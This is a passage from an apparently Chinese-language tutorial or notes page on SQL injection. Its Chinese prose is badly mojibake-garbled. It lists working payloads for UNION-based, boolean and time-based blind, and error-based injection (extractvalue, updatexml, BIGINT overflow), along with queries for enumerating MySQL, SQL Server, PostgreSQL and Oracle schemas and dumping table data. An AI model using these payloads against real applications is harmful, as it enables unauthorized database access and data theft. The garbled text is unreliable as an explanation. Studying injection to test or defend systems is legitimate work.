select 1,2,(select database()),4,5 and &#x27;%&#x27;=&#x27;Â ç»„è£…ä¸€ä¸‹å°±æ˜¯:Â SELECT*from database.table where users like &#x27;%%&#x27; union select 1,2,(select database()),4,5 and &#x27;%&#x27;=&#x27;%&#x27; </span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><hr><h5 id="å…³äºæ³¨é‡Šç¬¦"><a href="#å…³äºæ³¨é‡Šç¬¦" class="headerlink" title="å…³äºæ³¨é‡Šç¬¦"></a>å…³äºæ³¨é‡Šç¬¦</h5><blockquote><p>é‡‡ç”¨ â€œâ€“â€(åŒå‡å·)è¿›è¡Œå•è¡Œæ³¨é‡Šï¼Œæ³¨æ„ï¼šâ€â€“â€ä¸æ³¨é‡Šå†…å®¹è¦ç”¨ç©ºæ ¼éš”å¼€æ‰ä¼šç”Ÿæ•ˆ</p></blockquote><ul><li>MySQL<ul><li><code>#</code> :postï¼Œè¾“å…¥æ¡† ç›´æ¥å†™ï¼Œurlçš„getç”¨<code>%23</code></li><li><code>--+</code>:urlçš„getç›´æ¥å†™ï¼Œå¦‚æœåœ¨è¾“å…¥æ¡†ä¸­ä¼šæŠ¥é”™(ï¼ˆè¾“å…¥æ ä¸­è¾“å…¥ â€“ç©ºæ ¼ ä¹Ÿè¡Œ),å› ä¸ºåœ¨URLä¸­+ä¼šè¢«å½“åšç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯%20ï¼Œè€Œè¾“å…¥æ¡†ä¸­å°±æ˜¯+ã€‚</li><li>å¦å¤–ï¼Œ<code>æ³¨é‡Šè§£é‡Š/*!50001 sql*/</code>è¡¨ç¤ºæ•°æ®åº“5.00.01ç‰ˆæœ¬ä»¥ä¸Šçš„æ‰§è¡Œè¯¥sqlè¯­å¥</li></ul></li><li>PostgreSQL,SQL server,Oracle<ul><li>--+ è§„åˆ™åŒä¸Š</li></ul></li></ul><h5 id="æŸ¥è¯¢è¯­å¥æ„é€ "><a href="#æŸ¥è¯¢è¯­å¥æ„é€ " class="headerlink" title="æŸ¥è¯¢è¯­å¥æ„é€ "></a>æŸ¥è¯¢è¯­å¥æ„é€ </h5><ul><li>mysqlÂ select database(); #æŸ¥çœ‹å½“å‰æ•°æ®åº“<br>Â select user();<br>Â select group_concat(table_name) from information_schema.tables where<br>Â table_schema&#x3D;â€™securityâ€™â€“+ #çœ‹securityæ•°æ®åº“ä¸­çš„è¡¨å<br>Â select group_concat(column_name) from information_schema.columns where<br>Â table_name&#x3D;â€™usersâ€™ â€“+ #æŸ¥çœ‹usersè¡¨ä¸­çš„åˆ—å</li><li>SQL ServerÂ union select 1,null,â€™1â€™ â€“nullä»£è¡¨ç©ºï¼Œåœ¨ä¸çŸ¥é“æ•°æ®ç±»å‹æ—¶å¯ä»¥ç”¨nullä»£æ›¿<br>Â select db_name(); â€“æŸ¥çœ‹å½“å‰æ•°æ®åº“å<br>Â select SYSTEM_USER;<br>Â select top 1 null,null,name from sysdatabases where name not in (select top<br>Â 1 name from sysdatabases) â€“æŸ¥çœ‹ç³»ç»Ÿæ•°æ®åº“å<br>Â â€“æˆ–è€…<br>Â select null,null,name from sys.databases for xml path â€“åˆ©ç”¨XMLè·å–æ‰€æœ‰ç»“æœ<br>Â select top 1 name from test.sys.tables where name not in (select top 2 name<br>Â from test.sys.tables)<br>Â â€“æˆ–è€…<br>Â select top 1 TABLE_NAME from INFORMATION_SCHEMA.TABLES where<br>Â TABLE_NAME!&#x3D;â€™sysdiagramsâ€™; â€“ä¸€ä¸ªä¸€ä¸ªçœ‹æ•°æ®åº“ä¸­çš„è¡¨åï¼Œè¯¦è§æŠ¥é”™æ³¨å…¥<br>Â â€“æˆ–è€…<br>Â select null,null,name from test.sys.tables for xml path â€“åˆ©ç”¨XMLè·å–æ‰€æœ‰ç»“æœ<br>Â select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where<br>Â TABLE_NAME&#x3D;â€™table_testâ€™; â€“çœ‹è¡¨ä¸­åˆ—å<br>Â select top 1 name from table_test where name not in (select top 1 name from<br>Â table_test); â€“è·å¾—æ•°æ®å€¼</li><li>PostgreSQLÂ select current_database(); â€“å½“å‰æ•°æ®åº“å<br>Â select datname from pg_database limit 1 offset 0; â€“è·å–ç³»ç»Ÿæ•°æ®åº“å<br>Â select * from current_user;æˆ–è€… select user;<br>Â select CURRENT_SCHEMA() â€“æŸ¥çœ‹å½“å‰æƒé™<br>Â select tablename from pg_tables limit 1 offset 0; â€“è·å–æ•°æ®åº“è¡¨å<br>Â select column_name from information_schema.columns where table_name &#x3D;<br>Â â€˜testâ€™;â€“è·å–å­—æ®µå</li><li>OracleÂ select name from V$DATABASE;<br>Â select user from dual; â€“æŸ¥å½“å‰ç”¨æˆ·<br>Â select table_name,tablespace_name from user_tables; â€“è¡¨åå’Œè¡¨ç©ºé—´<br>Â select column_name from user_tab_columns where table_name&#x3D;â€™DOGâ€™; â€“è¡¨çš„åˆ—å<br>Â â€“oracleå¼±åŒ–äº†åº“çš„æ¦‚å¿µï¼Œå®ƒä»¥ç”¨æˆ·åä½œä¸ºåŒºåˆ†ï¼Œç”¨æˆ·å&#x3D;åº“åã€‚<br>Â select * from all_tables â€“æŸ¥è¯¢æ‰€æœ‰çš„è¡¨<br>Â select * from user_tables â€“æŸ¥è¯¢å‡ºå½“å‰ç”¨æˆ·çš„è¡¨<br>Â select * from all_tab_columns â€“æŸ¥è¯¢å‡ºæ‰€æœ‰çš„å­—æ®µ<br>Â select * from user_tab_columns â€“æŸ¥è¯¢å‡ºå½“å‰ç”¨æˆ·çš„å­—æ®µ</li></ul><h3 id="MYSQLæ³¨å…¥åˆ†ç±»"><a href="#MYSQLæ³¨å…¥åˆ†ç±»" class="headerlink" title="MYSQLæ³¨å…¥åˆ†ç±»"></a>MYSQLæ³¨å…¥åˆ†ç±»</h3><h5 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h5><p>è”åˆæŸ¥è¯¢ï¼šå°†å¤šä¸ªæŸ¥è¯¢çš„ç»“æœåˆå¹¶åˆ°ä¸€èµ·ï¼ˆçºµå‘åˆå¹¶ï¼‰ï¼šå­—æ®µæ•°ä¸å˜ï¼Œå¤šä¸ªæŸ¥è¯¢çš„è®°å½•æ•°åˆå¹¶</p><ul><li>å…³é”®å­—ï¼šunionã€ union all</li><li>éœ€è¦ä¸åŸæŸ¥è¯¢ç»“æœæ‹¥æœ‰ç›¸åŒæ•°é‡ä¸”ç»“æœå…¼å®¹çš„åˆ—</li><li>æ£€æµ‹<ul><li>order by åˆ—æ•°</li><li>union select 1,2ï¼Œâ€¦#</li><li>union all select 1,2ï¼Œâ€¦#</li></ul></li><li>æ³¨æ„ï¼šåŸæŸ¥è¯¢è¯­å¥å¯èƒ½åŒ…å«Limitç­‰é™åˆ¶æŸ¥è¯¢ç»“æœï¼Œæ‰€ä»¥ä½¿ç”¨unionæˆ–union allæŸ¥è¯¢çš„æ—¶å€™ï¼Œæœ€å¥½å± è”½æ­£ç¡®çš„æ‰§è¡Œç»“æœã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯å°†idçš„å€¼å˜ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„å€¼-1ï¼Œè¿™æ ·æœ€ç»ˆæŸ¥è¯¢åˆ°çš„å°±æ˜¯æˆ‘ä»¬unionçš„ç»“æœäº†ã€‚</li></ul><h5 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h5><p>ç›²æ³¨ï¼šå³åœ¨SQLæ³¨å…¥è¿‡ç¨‹ä¸­ï¼ŒSQLè¯­å¥æ‰§è¡ŒæŸ¥è¯¢åï¼ŒæŸ¥è¯¢æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„æ–¹å¼æ¥åˆ¤æ–­æˆ–å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹æˆä¸ºç›²æ³¨</p><p>åœ¨ç›²æ³¨ä¸­ï¼Œæ”»å‡»è€…æ ¹æ®å…¶è¿”å›é¡µé¢çš„ä¸åŒæ¥åˆ¤æ–­ä¿¡æ¯ï¼ˆå¯èƒ½æ˜¯é¡µé¢å†…å®¹çš„ä¸åŒï¼Œä¹Ÿå¯ä»¥æ˜¯å“åº”æ—¶é—´ä¸åŒï¼Œä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼‰</p><h6 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h6><p>ç›²æ³¨æŸ¥è¯¢æ˜¯ä¸éœ€è¦è¿”å›ç»“æœçš„ï¼Œä»…åˆ¤æ–­è¯­å¥æ˜¯å¦æ­£å¸¸æ‰§è¡Œå³å¯ï¼Œæ‰€ä»¥å…¶è¿”å›å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œæ­£å¸¸æ˜¾ç¤ºä¸ºtrueï¼ŒæŠ¥é”™æˆ–è€…æ˜¯å…¶ä»–ä¸æ­£å¸¸æ˜¾ç¤ºä¸ºFalse</p><ul><li>å…³é”®å‡½æ•°<ul><li>left(a,b):æˆªå–açš„å‰bä½</li><li>substr(a,b,c):ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦</li><li>ascii(str):å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºASCIIå€¼</li><li>chr(),char():å°†asciiå€¼è½¬æ¢ä¸ºå­—ç¬¦</li><li>ORD(str):åŒascii()ï¼Œè¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼</li><li>mid(a,b,c)ï¼šä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cä½</li><li>regexpâ€™æ­£åˆ™è¡¨è¾¾å¼â€™:æœ‰è¿”å›1ï¼Œæ²¡æœ‰è¿”å›0</li></ul></li></ul><h6 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h6><blockquote><p>å»¶æ—¶æ³¨å…¥ï¼šsleep()ã€benchmark()ã€ç¬›å¡å°”ç§¯ã€rlikeç­‰</p></blockquote><p>æ— è®ºæˆ‘ä»¬è¾“å…¥çš„è¯­å¥æ˜¯å¦åˆæ³•ï¼Œé¡µé¢çš„æ˜¾ç¤ºä¿¡æ¯æ˜¯å›ºå®šçš„ï¼Œå³ä¸ä¼šå‡ºç°æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œä¹Ÿä¸ä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯ã€‚å¯ä»¥å°è¯•åŸºäºæ—¶é—´çš„ç›²æ³¨æ¥æµ‹è¯•ã€‚æ ¹æ®é¡µé¢å“åº”çš„æ—¶é—´ï¼Œæ¥åˆ¤æ–­è¾“å…¥çš„ä¿¡æ¯æ˜¯å¦æ­£ç¡®ã€‚ åœ¨å¯ä»¥åˆ¤æ–­è¿”å›æ­£ç¡®è¿˜æ˜¯é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä¸¤ç§æ³¨å…¥æ–¹æ³•éƒ½å¯ä»¥ç”¨ï¼Œå»¶æ—¶æ³¨å…¥æ›´å€¾å‘äºæ— æ³•åˆ¤æ–­æ­£è¯¯ï¼Œé€šè¿‡è‡ªå·±æ„é€ é¡µé¢åˆ·æ–°æ—¶é—´æ¥åˆ¤æ–­æ­£è¯¯ã€‚</p><blockquote><p>IF è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â IF( expr1 , expr2 , expr3 )</span><br></pre></td></tr></table></figure><p>expr1 çš„å€¼ä¸º TRUEï¼Œåˆ™è¿”å›å€¼ä¸º expr2 expr1 çš„å€¼ä¸ºFALSEï¼Œåˆ™è¿”å›å€¼ä¸º expr3</p><p>åˆ©ç”¨payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â if (&#x27;åˆ¤æ–­è¯­å¥&#x27;,&#x27;æœ‰å…³å»¶æ—¶çš„å‡½æ•°&#x27;,1)</span><br></pre></td></tr></table></figure></blockquote><ul><li><p>å…³é”®å‡½æ•°</p><ul><li><p>sleep()Â </p></li><li><p>benchmark(10000000,md5(1)) ã€ heavy queryã€‘</p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">benchmark()æ˜¯mysqlå†…ç½®çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæµ‹è¯•å‡½æ•°æˆ–è€…è¡¨è¾¾å¼çš„æ‰§è¡Œé€Ÿåº¦ã€‚</span><br><span class="line"> ç”¨æ³•ï¼šbenchmark(é‡å¤æ¬¡æ•°, æ‰§è¡Œçš„å‡½æ•°)</span><br><span class="line"> &#x27;benchmark(t,exp)&#x27;</span><br><span class="line"> select benchmark(count,expr);  &#x27;æ˜¯é‡å¤æ‰§è¡Œcountæ¬¡exprè¡¨è¾¾å¼ï¼Œä½¿å¾—å¤„ç†æ—¶é—´å¾ˆé•¿ï¼Œæ¥äº§ç”Ÿå»¶è¿Ÿ&#x27;</span><br><span class="line"> </span><br><span class="line">æ¯”å¦‚</span><br><span class="line"> select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line"> select benchmark( 5000000, md5( &#x27;test&#x27; ));</span><br></pre></td></tr></table></figure><ul><li>ç¬›å¡å°”ç§¯</li></ul><p>ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from database.tableA,database.tableB</span><br></pre></td></tr></table></figure><p>å°±ä¼šå¯¹tableA,Bè¿›è¡Œç¬›å¡å°”è¿ç®—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">&#x27;ç¬›å¡å°”ç§¯(å› ä¸ºè¿æ¥è¡¨æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„æ“ä½œ)&#x27;</span><br><span class="line"> AxB=Aå’ŒBä¸­æ¯ä¸ªå…ƒç´ çš„ç»„åˆæ‰€ç»„æˆçš„é›†åˆï¼Œå°±æ˜¯è¿æ¥è¡¨</span><br><span class="line"> SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C;</span><br><span class="line"> select * from table_name A, table_name B</span><br><span class="line"> select * from table_name A, table_name Bï¼Œtable_name C</span><br><span class="line"> select count(*) from table_name A, table_name Bï¼Œtable_name C è¡¨å¯ä»¥æ˜¯åŒä¸€å¼ è¡¨</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from OPENQUERY([mysql],&#x27;select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)&#x27;)</span><br></pre></td></tr></table></figure><ul><li>GET_LOCK() åŠ é”</li></ul><p>å‡½æ•°ä½¿ç”¨è¯´æ˜ï¼šè®¾æ³•ä½¿ç”¨å­—ç¬¦ä¸²strç»™å®šçš„åå­—å¾—åˆ°ä¸€ä¸ªé”ï¼Œè¶…æ—¶ä¸ºtimeoutç§’ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select GET_LOCK(&#x27;a&#x27;,10)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè®¾ç½®é”åï¼Œéœ€è¦æ–°å¼€ä¸€ä¸ªçª—å£å¹¶ä¸”æ˜¯é•¿è¿æ¥æ‰ä¼šæœ‰æ•ˆã€‚</p><ul><li>RLIKEæ­£åˆ™</li></ul><p>é€šè¿‡<code>rpad</code>æˆ–<code>repeat</code>æ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡repeatçš„å‚æ•°å¯ä»¥æ§åˆ¶å»¶æ—¶é•¿çŸ­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br><span class="line">æ­£åˆ™è¯­æ³•ï¼š</span><br><span class="line">. : åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</span><br><span class="line">* ï¼š åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦</span><br><span class="line">[] : åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºä¸²ã€aã€bã€æˆ–è€…ç”±ä»»æ„ä¸ªaå’Œbç»„æˆçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">^ : åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">$ : åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">&#123;n&#125; : åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RPAD(str,len,padstr)</span><br><span class="line">ç”¨å­—ç¬¦ä¸² padstrå¯¹ strè¿›è¡Œå³è¾¹å¡«è¡¥ç›´è‡³å®ƒçš„é•¿åº¦è¾¾åˆ° lenä¸ªå­—ç¬¦é•¿åº¦ï¼Œç„¶åè¿”å› strã€‚å¦‚æœ strçš„é•¿åº¦é•¿äº lenï¼Œé‚£ä¹ˆå®ƒå°†è¢«æˆªé™¤åˆ° lenä¸ªå­—ç¬¦ã€‚</span><br><span class="line">mysql&gt; SELECT RPAD(&#x27;hi&#x27;,5,&#x27;?&#x27;); -&gt; &#x27;hi???&#x27;</span><br><span class="line">repeat(str,times)  å¤åˆ¶å­—ç¬¦ä¸²timesæ¬¡</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾æ–°çš„å»¶æ—¶å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â  concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç ç›¸å½“äº sleep(5) hhh</p><h5 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h5><hr><h6 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h6><p>SQLæŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚è¿™ç§æ‰‹æ®µåœ¨è”åˆæŸ¥è¯¢å—é™ä¸”èƒ½è¿”å›é”™è¯¯ä¿¡æ¯çš„æƒ…å†µä¸‹æ¯”è¾ƒå¥½ç”¨ã€‚</p><p>ç»è¿‡ç²¾å¿ƒæ„é€ çš„å‡½æ•°ï¼Œè®©å‡½æ•°å¤„ç†user()ç­‰ä¸åˆè§„å®šçš„æ•°æ®ï¼Œå¼•å‘mysqlæŠ¥é”™ã€‚æœ€å¸¸ç”¨çš„æ˜¯updatexml()ï¼Œä½†å¿…é¡»æ‰“å¼€é”™è¯¯æç¤º mysqli_error()ï¼ˆçœŸå®ç¯å¢ƒå¾ˆå°‘å‡ºç°ï¼‰</p><h6 id="xpathè¯­æ³•é”™è¯¯"><a href="#xpathè¯­æ³•é”™è¯¯" class="headerlink" title="xpathè¯­æ³•é”™è¯¯"></a>xpathè¯­æ³•é”™è¯¯</h6><hr><p><strong>extractvalueå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Â  Â  å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)</span><br><span class="line">Â  Â  æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);</span><br><span class="line">Â  Â  ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class="line">Â  Â  ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="line">Â  Â  ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯<strong>è¦æ±‚</strong>ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœ<strong>ä¸æ»¡è¶³è¦æ±‚</strong>ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†<strong>æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œ</strong>ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨</p><p>payloadï¼šselect extractvalue(â€œanythingâ€,concat(â€˜~â€™,(<strong>selectè¯­å¥)</strong>))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â  Â  (select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(selectè¯­å¥))))</span><br><span class="line">Â  Â  å¯¹äºmysql:</span><br><span class="line">Â  Â  æŸ¥æ•°æ®åº“åï¼š(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">Â  Â  çˆ†è¡¨åï¼š(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">Â  Â  çˆ†å­—æ®µåï¼š(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">Â  Â  çˆ†æ•°æ®ï¼š(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><p>â‘  0x7e&#x3D;â€™~â€™</p><p>â‘¡ concat(â€˜aâ€™,â€˜bâ€™)&#x3D;â€œabâ€</p><p>â‘¢ version()&#x3D;@@version</p><p>â‘£ â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦</p><p>â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</p><p><strong>updatexmlå‡½æ•°ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â  Â  çˆ†æ•°æ®åº“åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">Â  Â  çˆ†è¡¨åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">Â  Â  çˆ†åˆ—åï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">Â  Â  çˆ†æ•°æ®ï¼š&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h6 id="æ•°æ®æº¢å‡º"><a href="#æ•°æ®æº¢å‡º" class="headerlink" title="æ•°æ®æº¢å‡º"></a>æ•°æ®æº¢å‡º</h6><p><strong>åŸºäºBIGINTçš„æ•°æ®æº¢å‡º</strong></p><p><a href="https://blog.csdn.net/weixin_43902454/article/details/96495984">å‚è€ƒåšå®¢</a></p><p>åªæœ‰5.5.5åŠå…¶ä»¥ä¸Šç‰ˆæœ¬çš„MySQLæ‰ä¼šäº§ç”Ÿ<strong>æº¢å‡ºé”™è¯¯æ¶ˆæ¯</strong>ï¼Œä¹‹ä¸‹çš„ç‰ˆæœ¬å¯¹äºæ•´æ•°æº¢å‡ºä¸ä¼šå‘é€ä»»ä½•æ¶ˆæ¯ã€‚ æœ¬æ–‡çš„æ”»å‡»ä¹‹æ‰€ä»¥å¾—é€ï¼Œæ˜¯<strong>å› ä¸ºmysql_error()ä¼šå‘æˆ‘ä»¬è¿”å›é”™è¯¯æ¶ˆæ¯</strong>ï¼Œåªè¦è¿™æ ·ï¼Œæˆ‘ä»¬æ‰èƒ½å¤Ÿåˆ©ç”¨å®ƒæ¥è¿›è¡Œæ³¨å…¥ã€‚æ­¤å¤–ï¼Œåç«¯ä»£ç ä¸­çš„å¼•ç”¨ã€åŒå¼•å·æˆ–æ‹¬å·é—®é¢˜ï¼Œä¹Ÿä¼šå¼•èµ·æ³¨å…¥æ”»å‡»ã€‚</p><p><strong>æ•°æ®çš„æº¢å‡º</strong></p><blockquote><p>æ•°æ®ç±»å‹BIGINTçš„é•¿åº¦ä¸º8å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé•¿åº¦ä¸º64æ¯”ç‰¹ã€‚è¿™ç§æ•°æ®ç±»å‹æœ€å¤§çš„æœ‰ç¬¦å·å€¼ï¼Œç”¨äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶å’Œåè¿›åˆ¶çš„è¡¨ç¤ºå½¢å¼åˆ†åˆ«ä¸ºâ€œ0b0111111111111111111111111111111111111111111111111111111111111111â€ã€â€œ0x7fffffffffffffffâ€å’Œâ€œ9223372036854775807â€ã€‚ å½“å¯¹è¿™ä¸ªå€¼è¿›è¡ŒæŸäº›æ•°å€¼è¿ç®—çš„æ—¶å€™ï¼Œæ¯”å¦‚åŠ æ³•è¿ç®—ï¼Œå°±ä¼šå¼•èµ·â€œBIGINT value is out of rangeâ€é”™è¯¯ã€‚ä¸ºäº†é¿å…å‡ºç°ä¸Šé¢è¿™æ ·çš„é”™è¯¯ï¼Œæˆ‘ä»¬åªéœ€å°†å…¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°å³å¯ã€‚</p><p>å¯¹äºæ— 